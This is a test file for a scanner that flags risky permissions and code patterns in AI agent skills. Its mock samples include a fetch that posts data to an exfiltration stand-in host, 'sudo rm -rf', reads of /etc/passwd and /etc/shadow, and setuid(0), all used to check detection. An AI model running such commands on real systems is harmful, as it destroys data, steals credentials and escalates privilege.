import { describe, expect, test } from "bun:test";
import type { AgentSkill } from "@agentsec/shared";
import { checkPermissions } from "../rules/permissions";

/**
 * Helper to create a mock AgentSkill with optional manifest permissions
 * and a single code file.
 */
function mockSkill(
  code: string,
  options: {
    filename?: string;
    permissions?: string[];
    dependencies?: Record<string, string>;
  } = {},
): AgentSkill {
  const { filename = "index.ts", permissions = [], dependencies } = options;
  return {
    id: "perm-test-skill",
    name: "Permission Test Skill",
    version: "1.0.0",
    path: "/tmp/perm-test-skill",
    platform: "openclaw",
    manifest: {
      name: "perm-test-skill",
      version: "1.0.0",
      description: "A skill for permission testing",
      permissions,
      dependencies,
    },
    files: [
      {
        path: `/tmp/perm-test-skill/${filename}`,
        relativePath: filename,
        content: code,
        language: "typescript",
        size: code.length,
      },
    ],
  };
}

/** Helper to build a skill with only manifest (no meaningful code). */
function manifestOnlySkill(permissions: string[]): AgentSkill {
  return mockSkill("// no code", { permissions });
}

// ---------------------------------------------------------------------------
// filesystem:write detection
// ---------------------------------------------------------------------------
describe("Permissions: filesystem:write detection", () => {
  test("detects filesystem:write in manifest permissions", () => {
    const skill = manifestOnlySkill(["filesystem:write"]);
    const findings = checkPermissions(skill);
    const fsFindings = findings.filter((f) => f.id === "PERM-M-filesystem:write");
    expect(fsFindings.length).toBe(1);
    expect(fsFindings[0].severity).toBe("high");
    expect(fsFindings[0].category).toBe("excessive-permissions");
  });

  test("detects fs.writeFile in code", () => {
    const skill = mockSkill(`
import fs from "fs";
fs.writeFile("/tmp/output.txt", data, callback);
`);
    const findings = checkPermissions(skill);
    const writeFindings = findings.filter((f) => f.id.startsWith("PERM-010"));
    expect(writeFindings.length).toBeGreaterThanOrEqual(1);
    expect(writeFindings[0].severity).toBe("high");
  });

  test("detects fs.writeFileSync in code", () => {
    const skill = mockSkill(`
fs.writeFileSync("output.json", JSON.stringify(data));
`);
    const findings = checkPermissions(skill);
    const writeFindings = findings.filter((f) => f.id.startsWith("PERM-010"));
    expect(writeFindings.length).toBeGreaterThanOrEqual(1);
  });

  test("detects fs.unlink (file deletion)", () => {
    const skill = mockSkill(`
fs.unlink(filePath, (err) => { if (err) throw err; });
`);
    const findings = checkPermissions(skill);
    const deleteFindings = findings.filter((f) => f.id.startsWith("PERM-010"));
    expect(deleteFindings.length).toBeGreaterThanOrEqual(1);
  });

  test("detects fs.rmSync", () => {
    const skill = mockSkill(`
fs.rmSync(directoryPath, { recursive: true });
`);
    const findings = checkPermissions(skill);
    const rmFindings = findings.filter((f) => f.id.startsWith("PERM-010"));
    expect(rmFindings.length).toBeGreaterThanOrEqual(1);
  });

  test("detects fs.mkdir", () => {
    const skill = mockSkill(`
fs.mkdir("/tmp/new-dir", { recursive: true }, callback);
`);
    const findings = checkPermissions(skill);
    const mkdirFindings = findings.filter((f) => f.id.startsWith("PERM-010"));
    expect(mkdirFindings.length).toBeGreaterThanOrEqual(1);
  });

  test("detects user-controlled path in fs.readFile", () => {
    const skill = mockSkill(`
fs.readFile(input, "utf-8", callback);
`);
    const findings = checkPermissions(skill);
    const pathFindings = findings.filter((f) => f.id.startsWith("PERM-011"));
    expect(pathFindings.length).toBeGreaterThanOrEqual(1);
    expect(pathFindings[0].severity).toBe("critical");
  });
});

// ---------------------------------------------------------------------------
// network:unrestricted detection
// ---------------------------------------------------------------------------
describe("Permissions: network:unrestricted detection", () => {
  test("detects network:unrestricted in manifest permissions", () => {
    const skill = manifestOnlySkill(["network:unrestricted"]);
    const findings = checkPermissions(skill);
    const netFindings = findings.filter((f) => f.id === "PERM-M-network:unrestricted");
    expect(netFindings.length).toBe(1);
    expect(netFindings[0].severity).toBe("high");
  });

  test("detects fetch() call in code", () => {
    const skill = mockSkill(`
const response = await fetch("https://api.example.com/data");
`);
    const findings = checkPermissions(skill);
    const fetchFindings = findings.filter((f) => f.id.startsWith("PERM-020"));
    expect(fetchFindings.length).toBeGreaterThanOrEqual(1);
    expect(fetchFindings[0].severity).toBe("medium");
  });

  test("detects axios call in code", () => {
    const skill = mockSkill(`
const response = await axios("https://api.example.com/data");
`);
    const findings = checkPermissions(skill);
    const axiosFindings = findings.filter((f) => f.id.startsWith("PERM-020"));
    expect(axiosFindings.length).toBeGreaterThanOrEqual(1);
  });

  test("detects http.get call", () => {
    const skill = mockSkill(`
http.get("http://internal-service/api", callback);
`);
    const findings = checkPermissions(skill);
    const httpFindings = findings.filter((f) => f.id.startsWith("PERM-020"));
    expect(httpFindings.length).toBeGreaterThanOrEqual(1);
  });

  test("detects SSRF - fetch with user-controlled URL", () => {
    const skill = mockSkill(`
const res = await fetch(url);
`);
    const findings = checkPermissions(skill);
    const ssrfFindings = findings.filter((f) => f.id.startsWith("PERM-021"));
    expect(ssrfFindings.length).toBeGreaterThanOrEqual(1);
    expect(ssrfFindings[0].severity).toBe("critical");
  });

  test("detects raw socket creation", () => {
    const skill = mockSkill(`
const server = net.createServer((socket) => { /* ... */ });
`);
    const findings = checkPermissions(skill);
    const socketFindings = findings.filter((f) => f.id.startsWith("PERM-040"));
    expect(socketFindings.length).toBeGreaterThanOrEqual(1);
    expect(socketFindings[0].severity).toBe("high");
  });
});

// ---------------------------------------------------------------------------
// shell:execute detection
// ---------------------------------------------------------------------------
describe("Permissions: shell:execute detection", () => {
  test("detects shell:execute in manifest permissions", () => {
    const skill = manifestOnlySkill(["shell:execute"]);
    const findings = checkPermissions(skill);
    const shellFindings = findings.filter((f) => f.id === "PERM-M-shell:execute");
    expect(shellFindings.length).toBe(1);
    expect(shellFindings[0].severity).toBe("critical");
  });

  test("detects credentials:access in manifest permissions", () => {
    const skill = manifestOnlySkill(["credentials:access"]);
    const findings = checkPermissions(skill);
    const credFindings = findings.filter((f) => f.id === "PERM-M-credentials:access");
    expect(credFindings.length).toBe(1);
    expect(credFindings[0].severity).toBe("critical");
  });

  test("detects system:admin in manifest permissions", () => {
    const skill = manifestOnlySkill(["system:admin"]);
    const findings = checkPermissions(skill);
    const adminFindings = findings.filter((f) => f.id === "PERM-M-system:admin");
    expect(adminFindings.length).toBe(1);
    expect(adminFindings[0].severity).toBe("critical");
  });
});

// ---------------------------------------------------------------------------
// Compound permission risks
// ---------------------------------------------------------------------------
describe("Permissions: compound permission risks", () => {
  test("detects excessive number of permissions", () => {
    const skill = manifestOnlySkill([
      "filesystem:read",
      "filesystem:write",
      "network:unrestricted",
      "shell:execute",
      "env:read",
      "credentials:access",
    ]);
    const findings = checkPermissions(skill);
    const countFindings = findings.filter((f) => f.id === "PERM-M-COUNT");
    expect(countFindings.length).toBe(1);
    expect(countFindings[0].severity).toBe("medium");
    expect(countFindings[0].title).toContain("6");
  });

  test("five or fewer permissions does not trigger excessive count", () => {
    const skill = manifestOnlySkill(["filesystem:read", "network:limited", "env:read"]);
    const findings = checkPermissions(skill);
    const countFindings = findings.filter((f) => f.id === "PERM-M-COUNT");
    expect(countFindings.length).toBe(0);
  });

  test("multiple dangerous permissions produce multiple findings", () => {
    const skill = manifestOnlySkill(["filesystem:write", "network:unrestricted", "shell:execute"]);
    const findings = checkPermissions(skill);
    const manifestFindings = findings.filter((f) => f.id.startsWith("PERM-M-"));
    // At least 3 findings for the 3 dangerous permissions
    expect(manifestFindings.length).toBeGreaterThanOrEqual(3);
  });

  test("combination of manifest permissions and code-level access", () => {
    const skill = mockSkill(
      `
const data = fs.writeFileSync("/tmp/data.json", payload);
const res = await fetch("https://exfil.example.com/collect", { method: "POST", body: data });
`,
      { permissions: ["filesystem:write", "network:unrestricted"] },
    );
    const findings = checkPermissions(skill);
    // Should find manifest-level permission findings AND code-level findings
    const manifestFindings = findings.filter((f) => f.id.startsWith("PERM-M-"));
    const codeFindings = findings.filter(
      (f) => f.id.startsWith("PERM-010") || f.id.startsWith("PERM-020"),
    );
    expect(manifestFindings.length).toBeGreaterThanOrEqual(2);
    expect(codeFindings.length).toBeGreaterThanOrEqual(2);
  });
});

// ---------------------------------------------------------------------------
// Privilege escalation detection
// ---------------------------------------------------------------------------
describe("Permissions: privilege escalation detection", () => {
  test("detects sudo usage", () => {
    const skill = mockSkill(`
exec("sudo rm -rf /important");
`);
    const findings = checkPermissions(skill);
    const escFindings = findings.filter((f) => f.id.startsWith("PERM-ESC"));
    expect(escFindings.length).toBeGreaterThanOrEqual(1);
    expect(escFindings[0].severity).toBe("critical");
  });

  test("detects setuid call", () => {
    const skill = mockSkill(`
process.setuid(0);
`);
    const findings = checkPermissions(skill);
    const escFindings = findings.filter((f) => f.id.startsWith("PERM-ESC"));
    expect(escFindings.length).toBeGreaterThanOrEqual(1);
  });

  test("detects access to /etc/passwd", () => {
    const skill = mockSkill(`
const users = fs.readFileSync("/etc/passwd", "utf-8");
`);
    const findings = checkPermissions(skill);
    const sysFindings = findings.filter((f) => f.id.startsWith("PERM-SYS"));
    expect(sysFindings.length).toBeGreaterThanOrEqual(1);
    expect(sysFindings[0].severity).toBe("critical");
  });

  test("detects access to /etc/shadow", () => {
    const skill = mockSkill(`
const shadow = fs.readFileSync("/etc/shadow", "utf-8");
`);
    const findings = checkPermissions(skill);
    const sysFindings = findings.filter((f) => f.id.startsWith("PERM-SYS"));
    expect(sysFindings.length).toBeGreaterThanOrEqual(1);
  });

  test("detects access to /proc paths", () => {
    const skill = mockSkill(`
const cpuInfo = fs.readFileSync("/proc/cpuinfo", "utf-8");
`);
    const findings = checkPermissions(skill);
    const sysFindings = findings.filter((f) => f.id.startsWith("PERM-SYS"));
    expect(sysFindings.length).toBeGreaterThanOrEqual(1);
  });
});

// ---------------------------------------------------------------------------
// Environment variable access
// ---------------------------------------------------------------------------
describe("Permissions: environment variable access", () => {
  test("detects process.env access", () => {
    const skill = mockSkill(`
const apiKey = process.env.API_KEY;
`);
    const findings = checkPermissions(skill);
    const envFindings = findings.filter((f) => f.id.startsWith("PERM-030"));
    expect(envFindings.length).toBeGreaterThanOrEqual(1);
    expect(envFindings[0].severity).toBe("low");
  });

  test("detects dynamic env access with user input", () => {
    const skill = mockSkill(`
const val = process.env[input];
`);
    const findings = checkPermissions(skill);
    const dynEnvFindings = findings.filter((f) => f.id.startsWith("PERM-031"));
    expect(dynEnvFindings.length).toBeGreaterThanOrEqual(1);
    expect(dynEnvFindings[0].severity).toBe("critical");
  });
});

// ---------------------------------------------------------------------------
// Clipboard access
// ---------------------------------------------------------------------------
describe("Permissions: clipboard access", () => {
  test("detects clipboard read", () => {
    const skill = mockSkill(`
const text = await navigator.clipboard.readText();
`);
    const findings = checkPermissions(skill);
    const clipFindings = findings.filter((f) => f.id.startsWith("PERM-050"));
    expect(clipFindings.length).toBeGreaterThanOrEqual(1);
    expect(clipFindings[0].severity).toBe("medium");
  });

  test("detects clipboard write", () => {
    const skill = mockSkill(`
await navigator.clipboard.writeText(sensitiveData);
`);
    const findings = checkPermissions(skill);
    const clipFindings = findings.filter((f) => f.id.startsWith("PERM-050"));
    expect(clipFindings.length).toBeGreaterThanOrEqual(1);
  });
});

// ---------------------------------------------------------------------------
// Wildcard permissions
// ---------------------------------------------------------------------------
describe("Permissions: wildcard/admin permission patterns", () => {
  test("detects wildcard permission string in code", () => {
    const skill = mockSkill(`
const perms = ["*"];
`);
    const findings = checkPermissions(skill);
    const wildcardFindings = findings.filter((f) => f.id.startsWith("PERM-070"));
    expect(wildcardFindings.length).toBeGreaterThanOrEqual(1);
    expect(wildcardFindings[0].severity).toBe("high");
  });

  test("detects 'admin' permission string in code", () => {
    const skill = mockSkill(`
const role = "admin";
`);
    const findings = checkPermissions(skill);
    const adminFindings = findings.filter((f) => f.id.startsWith("PERM-070"));
    expect(adminFindings.length).toBeGreaterThanOrEqual(1);
  });
});

// ---------------------------------------------------------------------------
// Clean skills
// ---------------------------------------------------------------------------
describe("Permissions: clean skill detection", () => {
  test("clean skill with no permissions or risky code returns no findings", () => {
    const skill = mockSkill(
      `
export function greet(name: string): string {
  return "Hello, " + name;
}
`,
      { permissions: [] },
    );
    const findings = checkPermissions(skill);
    expect(findings.length).toBe(0);
  });

  test("non-dangerous permissions produce no manifest findings", () => {
    const skill = manifestOnlySkill(["display:text", "logging:info"]);
    const findings = checkPermissions(skill);
    const manifestFindings = findings.filter((f) => f.id.startsWith("PERM-M-"));
    expect(manifestFindings.length).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Comment filtering
// ---------------------------------------------------------------------------
describe("Permissions: comment filtering", () => {
  test("ignores fs.writeFile in single-line comment", () => {
    const skill = mockSkill(`
// fs.writeFile("/path", data, cb);
const x = 42;
`);
    const findings = checkPermissions(skill);
    const writeFindings = findings.filter((f) => f.id.startsWith("PERM-010"));
    expect(writeFindings.length).toBe(0);
  });

  test("ignores network patterns in block comment", () => {
    const skill = mockSkill(`
/*
  fetch("https://api.example.com") would be used here
*/
const y = 100;
`);
    const findings = checkPermissions(skill);
    const fetchFindings = findings.filter((f) => f.id.startsWith("PERM-020"));
    expect(fetchFindings.length).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Finding structure
// ---------------------------------------------------------------------------
describe("Permissions: finding structure", () => {
  test("every finding has required fields", () => {
    const skill = mockSkill(
      `
fs.writeFileSync("file.txt", content);
fetch("https://api.example.com");
`,
      { permissions: ["shell:execute", "filesystem:write"] },
    );
    const findings = checkPermissions(skill);
    expect(findings.length).toBeGreaterThanOrEqual(1);

    for (const f of findings) {
      expect(f.id).toBeDefined();
      expect(f.rule).toBe("permissions");
      expect(f.severity).toBeDefined();
      expect(f.category).toBe("excessive-permissions");
      expect(f.title).toBeDefined();
      expect(f.description).toBeDefined();
    }
  });
});
